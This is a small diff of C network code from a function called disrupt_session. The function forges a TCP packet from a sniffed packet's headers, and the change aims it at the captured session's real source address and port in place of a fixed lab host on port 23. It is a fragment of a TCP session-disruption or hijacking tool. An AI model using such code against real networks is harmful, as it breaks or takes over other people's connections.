@@ -83,8 +83,8 @@ void disrupt_session(void *sniffedPacket) {
     struct tcphdr *tcpHeader    = (struct tcphdr *)(ipHeader + (4 * ipHeader->ip_hl));
     struct sockaddr_in addr_in;
     addr_in.sin_family          = AF_INET;
-    addr_in.sin_port            = ntohs(23); //tcpHeader->source);
-    addr_in.sin_addr.s_addr     = inet_addr("192.168.1.112");   //inet_ntoa(ipHeader->ip_src));
+    addr_in.sin_port            = ntohs(tcpHeader->source);
+    addr_in.sin_addr.s_addr     = inet_addr(inet_ntoa(ipHeader->ip_src));
     int sizeOfPacket            = sizeof(struct tcphdr) + sizeof(struct iphdr) + 2;
     void *packet                = malloc(sizeOfPacket);
     uint32_t ack_inc            = 1;       // Amount to increase ack by
